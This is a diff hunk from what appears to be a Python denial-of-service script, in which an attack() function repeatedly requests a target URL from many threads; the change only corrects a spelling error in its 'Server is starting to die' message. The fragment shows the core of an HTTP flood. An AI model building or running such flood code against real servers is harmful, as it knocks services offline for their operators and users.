@@ -11,7 +11,7 @@ def attack():
             request = requests.get(url, timeout=1)
             print(request.status_code)
         except:
-            print("Serwer is starting to die")
+            print("Server is starting to die")
 
 for i in range(count):
     t = threading.Thread(target=attack)
